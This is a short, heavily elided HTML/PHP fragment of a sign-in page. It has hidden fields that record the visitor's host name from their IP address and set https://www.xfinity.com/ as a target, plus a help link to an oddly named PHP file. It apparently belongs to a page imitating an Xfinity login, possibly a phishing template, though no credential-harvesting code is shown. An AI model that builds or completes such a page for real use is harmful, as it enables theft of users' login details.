    ...
    <div id="myApp">
      ...
      <main class="main-container cw-container cw-toolbar-fixed-adjust" role="main">
        ...
        <div class="login-card cw-card">
          <header role="banner">
            <h1>
              <img src="assets/images/ccc-logo.svg"  border="0" class="logo" />
          ...
          <input type="hidden" name="mso" value="ccc">
            ...
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
				...
				<input type="hidden" name="target" value="https://www.xfinity.com/">
        ...
        <p><a href="help5d8f.php?mso=ccc">Need Help?</a></p>
        <div class="terms">
